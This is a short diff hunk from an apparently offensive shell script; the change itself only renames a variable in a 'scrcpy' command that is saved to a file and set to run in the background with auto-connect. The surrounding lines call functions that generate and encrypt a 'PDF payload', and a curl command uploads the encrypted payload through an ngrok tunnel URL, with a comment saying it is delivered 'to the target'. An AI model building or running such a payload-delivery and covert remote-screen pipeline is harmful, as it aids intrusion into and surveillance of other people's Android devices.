@@ -80,7 +80,7 @@ generate_pdf_payload
 encrypt_pdf_payload
 
 # Save the scrcpy command to a file
-echo "scrcpy -d $android_device_ip --background --auto-connect yes" > "$command_file"
+echo "scrcpy -d $android_device_id --background --auto-connect yes" > "$command_file"
 
 # Deliver the PDF payload to the target
 curl -F "file=@$fragmented_pdf_payload.enc" $ngrok_tunnel_url/upload
